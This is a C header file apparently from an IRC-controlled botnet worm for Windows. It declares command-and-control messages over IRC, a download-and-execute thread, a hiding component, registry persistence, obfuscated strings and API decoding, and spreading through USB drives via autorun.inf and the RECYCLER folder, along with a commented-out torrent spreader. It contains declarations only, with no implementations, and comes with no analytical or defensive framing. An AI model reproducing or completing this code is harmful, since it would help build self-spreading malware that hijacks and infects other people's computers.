	#define WIN32_LEAN_AND_MEAN

//	#define debug //for debugging.

    #define MAX_LINE				512
    #define MAX_RECEIVE_BUFFER		2048
    #define MAX_WORDS				64
    #define MAX_THREADS				256
    #define THREAD_WAIT_TIME        1024

 	#pragma comment(linker, "/FILEALIGN:256")

    #include <windows.h>
 	#include <winsock2.h>
 	#include <tchar.h>
 	#include <stdio.h>
 	#include <shlwapi.h>

    #include "apis.h"
extern char cmd__rmme[];
    typedef enum
    {
        MSG_ps,
        MSG_nk,
        MSG_usr,
        MSG_PONG,
        MSG_jn,
        MSG_pt,
        MSG_s4y,
        MSG_qt
    } my_messages;

    typedef enum
    {
        NONE,
        T_WGET,
        T_HIDER,
        T_USB,
        T_NewInstall
    } thread_type;

    typedef struct
    {
        HANDLE		tHandle;
        thread_type type;
        SOCKET		tsock;
    } thread_s;

    typedef struct
    {
        unsigned long	ip;
        char			ip_char[16];
        char			myip[16];
        unsigned short	port;
        SOCKET			omgsockz;
        char			channel[128];
    } exparam_s;

    typedef struct
    {
        char	url[256];
        char	destination[MAX_PATH];
        char	channel[128];
        int		mode;
        SOCKET	ircsock;
        int		tnum;
    } download_s;

    typedef struct
    {
        char *host;
        unsigned short port;
        char *psword;
    } my_;

    typedef struct
    {
       char sDir[MAX_PATH];
       char sPath_ProgFiles[MAX_PATH];
       char sPath_MyDoc[MAX_PATH];
       char *data1;
    } p2pInfo;
    extern char wgrm [];
    extern char rdpcmd [];
      extern char rng [];
        extern char ns [];
          extern char dld [];
        extern char wgerr [];
    extern char qtmsg [];
    extern char *chan;
    extern char *chanps;
 	extern char *authost;
    extern char *prefix;
    extern char *mutex;
    extern char *NewInstall_Host;
extern char exename [];
  extern char regkey [];
    extern char regname [];
    extern char open [];
    extern char my_usragent[];
    extern char *key13;
    extern char cryptokey [];
    extern char rcmsg [];
    extern char inip[16];
    extern char exip[16];

    extern thread_s		threads[MAX_THREADS];
    extern int          omgsockz;
    int threadnum;
    char *my_nktype(void);
    extern HANDLE ih;

    /* THREADS */
    HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
    void Thread_Clear(int num);
    int Thread_Add(thread_type type);
    void Thread_Prepare();
    int Thread_Check(thread_type type);
    int Thread_Kill(thread_type type);

    /* IRC */
    DWORD WINAPI Node_Thread(LPVOID param);
    int Node_Send(SOCKET sock, my_messages msg, char *buffer, char *to);
    int Node_Connect(char *host, unsigned short port);

    /* HIDER */

    /* WGET */
    DWORD WINAPI Wget_Thread(LPVOID param);

    /* ENCRYPTION */
    char* Reverse_Str(char* str);
    void decode_things(void);
    void decode_apis(void);
    /* UTILS */
    void Install_Files(void);

    /* SPREADER - USB+ */
    DWORD WINAPI USBplus_Spread(void *sock);
extern char USBSLEEPTIME [];
extern char USB_STR_RECYCLER [];
extern char USB_STR_REC_SUBDIR [];
extern char USB_STR_DESKTOP_DATA [];
extern char USB_STR_DESKTOP_INI [];
extern char USB_STR_AUTORUN_INF [];
extern char USB_STR_AUTORUN_DATA1 [];
extern char USB_STR_AUTORUN_DATA2 [];
extern char USB_STR_AUTORUN_DATA3 [];
extern char USB_STR_FILENAME [];
    /* SPREADER - TORRENT */
 //   int SeedMyTorrent( char* szUrl, char* szSaveAs, char* szSeedTo);
